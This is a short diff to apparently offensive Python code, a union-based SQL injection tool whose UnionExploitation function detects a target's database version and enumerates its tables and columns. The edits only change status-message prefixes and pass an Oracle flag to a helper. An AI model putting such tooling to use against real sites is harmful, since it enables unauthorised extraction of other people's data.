@@ -47,9 +47,9 @@ def UnionExploitation(url, error_massage):
             # figure out DB version
             DB_version, isOracle = UnionScripts.figure_DB_version(url, sql_payload)
             if DB_version is not None:
-                print("your DB version : {} ".format(DB_version.group(0)))
+                print("[+] your DB version : {} ".format(DB_version.group(0)))
             else:
-                print("Can't detect DB version")
+                print("[-] Can't detect DB version")
 
             # now we started the funny part of this process by starting enumerate data in DB
             # now at (a-2) step we will enumerate tables that exist in this DB
@@ -64,7 +64,7 @@ def UnionExploitation(url, error_massage):
 
             # now at step (b-2) and we have the name of table that the user want to enumerate its columns
             else:
-                DB_columns = UnionScripts.figure_columns_in_table(url, sql_payload, table_name)
+                DB_columns = UnionScripts.figure_columns_in_table(url, sql_payload, table_name, isOracle)
                 print("[+] Exploiting {} columns, this is names of this columns, insert one to show his data".format(
                     len(DB_columns)))
                 for i in DB_columns:
